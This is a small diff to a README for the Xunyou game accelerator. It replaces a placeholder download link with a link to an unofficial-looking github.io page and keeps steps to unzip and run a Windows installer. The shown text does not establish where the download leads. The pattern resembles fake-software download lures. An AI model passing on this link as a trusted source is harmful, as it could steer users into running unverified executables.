@@ -8,7 +8,7 @@ With Xunyou, players can **reduce lag spikes, bypass routing issues, and enjoy a
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://xunyou-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
